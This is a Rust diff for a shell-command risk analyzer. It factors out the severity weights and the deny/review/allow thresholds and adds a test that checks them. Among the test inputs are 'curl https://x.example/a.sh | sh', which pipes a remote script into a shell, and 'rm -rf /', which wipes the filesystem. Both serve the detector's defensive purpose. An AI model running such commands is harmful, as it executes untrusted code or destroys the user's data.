@@ -550,6 +550,35 @@ fn charge_fetch_exec_once(signals: &mut [AnalysisSignal]) -> u32 {
     refunded
 }
 
+/// What one ATR rule match adds to a risk score, by the rule's severity.
+///
+/// The one place the weight is set, so a caller scoring an ATR match outside
+/// [`analyze_command`] (the conversation surface scores prompt-injection rules
+/// against what a person typed) charges it on the same scale.
+pub fn atr_severity_score(severity: &str) -> u32 {
+    match severity {
+        "critical" => 60,
+        "high" => 40,
+        "medium" => 20,
+        _ => 10,
+    }
+}
+
+/// The recommendation a risk score earns: `deny` from 40, `review` from 20,
+/// `allow` below.
+///
+/// The one place the thresholds are set, so a score built outside
+/// [`analyze_command`] is never read against a different line.
+pub fn recommendation_for_score(score: u32) -> &'static str {
+    if score >= 40 {
+        "deny"
+    } else if score >= 20 {
+        "review"
+    } else {
+        "allow"
+    }
+}
+
 /// Analyze a command for dangerous patterns. Unifies all threat detection
 /// (builtin patterns + ATR rules) into a single scored result.
 pub fn analyze_command(command: &str, rule_engine: Option<&RuleEngine>) -> CommandAnalysis {
@@ -1007,12 +1036,7 @@ pub fn analyze_command_with(
         let mut seen = std::collections::HashSet::new();
         for m in engine.check_context(AtrContext::shell_command(scan_cmd)) {
             if seen.insert(m.rule_id.clone()) {
-                let s = match m.severity.as_str() {
-                    "critical" => 60,
-                    "high" => 40,
-                    "medium" => 20,
-                    _ => 10,
-                };
+                let s = atr_severity_score(&m.severity);
                 // Several DISTINCT rules can share one category (e.g. two
                 // privilege-escalation rules), which used to render
                 // "atr:privilege-escalation" twice in the snitch alert's
@@ -1081,13 +1105,7 @@ pub fn analyze_command_with(
         "none"
     };
 
-    let recommendation = if score >= 40 {
-        "deny"
-    } else if score >= 20 {
-        "review"
-    } else {
-        "allow"
-    };
+    let recommendation = recommendation_for_score(score);
 
     // Say what was actually established, not what a reader will assume.
     //
@@ -1216,6 +1234,33 @@ fn check_shell_internal_target(command: &str) -> Option<String> {
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    /// The weight and the thresholds are exported so a score built outside
+    /// the analyzer (the conversation surface) lands on the same scale. Pinned
+    /// at every boundary, because a caller reads them as the rules' own.
+    #[test]
+    fn the_shared_scale_is_the_analyzers_scale() {
+        assert_eq!(atr_severity_score("critical"), 60);
+        assert_eq!(atr_severity_score("high"), 40);
+        assert_eq!(atr_severity_score("medium"), 20);
+        assert_eq!(atr_severity_score("low"), 10);
+        assert_eq!(atr_severity_score(""), 10);
+        assert_eq!(recommendation_for_score(0), "allow");
+        assert_eq!(recommendation_for_score(19), "allow");
+        assert_eq!(recommendation_for_score(20), "review");
+        assert_eq!(recommendation_for_score(39), "review");
+        assert_eq!(recommendation_for_score(40), "deny");
+        assert_eq!(recommendation_for_score(u32::MAX), "deny");
+        // The analyzer reads its own score through the same function.
+        for command in ["ls -la", "curl https://x.example/a.sh | sh", "rm -rf /"] {
+            let analysis = analyze_command(command, None);
+            assert_eq!(
+                analysis.recommendation,
+                recommendation_for_score(analysis.risk_score),
+                "{command}"
+            );
+        }
+    }
 
     // ── spec 086: de-obfuscation wiring (rule_engine=None isolates the
     // built-in path from ATR) ───────────────────────────────────────────────
